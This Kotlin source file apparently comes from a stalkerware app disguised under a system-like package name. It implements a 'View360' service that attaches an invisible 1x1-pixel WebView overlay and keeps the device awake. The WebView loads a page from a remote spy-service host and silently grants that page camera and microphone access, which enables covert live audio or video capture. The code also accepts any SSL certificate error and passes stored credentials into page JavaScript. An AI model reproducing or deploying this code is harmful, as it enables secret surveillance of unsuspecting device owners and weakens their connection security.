package com.android.services.workers.view360

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.net.http.SslError
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.Gravity
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.PermissionRequest
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout
import androidx.core.content.ContextCompat
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.services.view360.View360CommandProcessingBaseI
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.workers.FutureWorkUtil
import kotlinx.coroutines.CoroutineScope
import org.json.JSONException
import org.json.JSONObject

class View360CommandProcessingBaseImpll(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val coroutineScope: CoroutineScope
) : View360CommandProcessingBase(context) {
    /**
     * Initialize the Window [WindowManager] by adding a WebView to the Window
     * Setup the webView with Credentials, and loads the view360 Url in WebView
     */
    override fun initialize() {
        logVerbose("${View360CommandProcessingBaseI.TAG} In OnCreate")
        try {
            ContextCompat.getMainExecutor(context).execute {
                logVerbose("${View360CommandProcessingBaseI.TAG} In Initialize() -> Ready to attach WebView to Window")
                acquireWakeLock()
                mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val layoutParams = WindowManager.LayoutParams(
                    1, 1,
                    windowManagerFlagOverlay,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT
                )
                layoutParams.gravity = Gravity.START or Gravity.TOP
                mWebView = WebView(applicationContext)
                mWebView!!.layoutParams = LinearLayout.LayoutParams(
                    1, 1
                )
                mWindowManager!!.addView(mWebView, layoutParams)
                logVerbose("${View360CommandProcessingBaseI.TAG} WebView Attached to Window ")
                setUpWebViewDefaults(mWebView!!)
                setView360User()

                // Setup WebView Client
                mWebView!!.webViewClient = mWebViewClient

                // SetUp WebChrome Client
                mWebView!!.webChromeClient = mWebChromeClient
                mWebView!!.resumeTimers()

                mWebView!!.loadUrl("https://node-api.theonespy.com:7000/cc.html")
            }
            View360CommandProcessingBaseI.view360BugStatus = FcmPushStatus.INITIALIZED.getStatus()
        } catch (exp: Exception) {
            logException(
                "${View360CommandProcessingBaseI.TAG} Initialize() Error: ${exp.message}",
                View360CommandProcessingBaseI.TAG, exp
            )
            stopThisService()
        }
    }

    /** Web Chrome Client **/
    private val mWebChromeClient = object : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest) {
            mHandler.post {
                if (request.origin.toString() == "https://node-api.theonespy.com:7000/") {
                    request.grant(request.resources)
                } else {
                    request.deny()
                }
            }
        }
    }

    /** Web View Client **/
    private val mWebViewClient = object : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView,
            urlNewString: String,
        ): Boolean {
            if (!loadingFinished) {
                redirect = true
            }
            loadingFinished = false
            view.loadUrl(urlNewString)
            return true
        }

        override fun onReceivedError(
            view: WebView,
            request: WebResourceRequest,
            error: WebResourceError,
        ) {
            super.onReceivedError(view, request, error)
            stopThisService()
        }

        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }

        override fun onPageStarted(view: WebView, url: String, facIcon: Bitmap?) {
            loadingFinished = false
        }

        override fun onPageFinished(view: WebView, url: String) {
            if (!redirect) {
                loadingFinished = true
            }
            if (loadingFinished && !redirect) {
                try {
                    mWebView!!.loadUrl("javascript:window:initSession(\"" + clientUserName + "\" , \"" + clientPassword + "\", \"" + getCallType() + "\")")
                } catch (e: Exception) {
                    logException(
                        "onPage Finished exception  ${e.message}",
                        View360CommandProcessingBaseI.TAG, e
                    )
                    stopThisService()
                }
            } else {
                redirect = false
            }
        }
    }

    /** Get the Registered View 360 User Credentials **/
    private fun setView360User() {
        if (AppConstants.view360User != null && AppConstants.view360User!!.isNotEmpty()) {
            try {
                val sipUserJson = JSONObject(AppConstants.view360User!!)
                clientUserName = sipUserJson.getString("clientUserName")
                clientPassword = sipUserJson.getString("clientPassword")
            } catch (e: JSONException) {
                logException(
                    "onPage Finished exception  ${e.message}",
                    View360CommandProcessingBaseI.TAG, e
                )
                stopThisService()
            }
        } else {
            stopThisService()
            return
        }
    }

    /** Returns the type of view360 Call Either Audio or Video **/
    private fun getCallType(): String {
        val isMicrophoneAvailable = AppUtils.isMicrophoneAvailable(applicationContext)
        return if (AppConstants.isSpyAudioCall) {
            if (isMicrophoneAvailable) "5" else "4"
        } else {
            var topPackage = ""
            if (AppUtils.isAccessibilityEnabled(applicationContext)) {
                topPackage = AccessibilityUtils.lastWindowPackage
            }
            if (topPackage == AppUtils.getDefaultCamera() || !isMicrophoneAvailable) {
                "4"
            } else {
                AppConstants.view360CameraType
            }
        }
    }

    /** Destroy the WebView and release it's resources **/
    private fun destroyWebView() {
        // Make sure you remove the WebView from its parent view before doing anything.
        mWebView!!.removeAllViews()
        mWebView!!.clearHistory()

        // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
        // Probably not a great idea to pass true if you have other WebViews still alive.
        mWebView!!.clearCache(true)

        // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
        // mWebView.loadUrl("about:blank");
        mWebView!!.onPause()
        mWebView!!.removeAllViews()
        mWebView!!.destroyDrawingCache()

        // NOTE: This pauses JavaScript execution for ALL WebViews,
        // do not use if you have other WebViews still alive.
        // If you create another WebView after calling this,
        // make sure to call mWebView.resumeTimers().
        mWebView!!.pauseTimers()
        // NOTE: This can occasionally cause a segfault below API 17 (4.2)
        mWebView!!.destroy()
        // Null out the reference so that you don't end up re-using it.
        mWebView = null
    }

    /**
     * Set WebView Defaults
     * @param webView Instance of Web View
     */
    private fun setUpWebViewDefaults(webView: WebView) {
        val settings = webView.settings
        try {
            // Enable Javascript
            settings.javaScriptEnabled = true
            settings.setAppCacheEnabled(false)
            settings.cacheMode = WebSettings.LOAD_NO_CACHE
            settings.allowFileAccessFromFileURLs = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccessFromFileURLs = true
            settings.allowUniversalAccessFromFileURLs = true
            // Use WideViewport and Zoom out if there is no viewport defined
            settings.useWideViewPort = true
            settings.loadWithOverviewMode = true
            // Enable pinch to zoom without the zoom buttons
            settings.builtInZoomControls = true
            // Allow use of Local Storage
            settings.domStorageEnabled = true
            // Hide the zoom controls for HONEYCOMB+
            settings.displayZoomControls = false
            // Enable remote debugging via chrome://inspect
            if (AppConstants.osGreaterThanOrEqualLollipop) {
                WebView.setWebContentsDebuggingEnabled(
                    true
                )
                // AppRTC requires third party cookies to work
                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptThirdPartyCookies(mWebView, true)
            }
        } catch (e: Exception) {
            logException("${View360CommandProcessingBaseI.TAG} ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    override fun onServiceDestroy() {
        logVerbose("${View360CommandProcessingBaseI.TAG} In OnDestroy -> Releasing Resources")
        try {
            if (mWebView != null && mWebView!!.parent != null) {
//                    mWindowManager!!.removeViewImmediate(mWebView)
                mWindowManager!!.removeView(mWebView)
                destroyWebView()
            }
            releaseWakeLock()
            AppConstants.view360InteruptMessage = ""
        } catch (exp: Exception) {
            logException("${View360CommandProcessingBaseI.TAG} onDestroy Exception = ${exp.message}")
            stopThisService()
        }
    }

    override fun startCommand() {
    }

    private fun stopThisService() {
        FutureWorkUtil.stopBackgroundWorker(context,TAG_360_WORKER)
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
            val pm = context.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            View360CommandProcessingBaseI.TAG_VIEW_360_BUG_WORK
        )
        wakeLock!!.acquire()
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}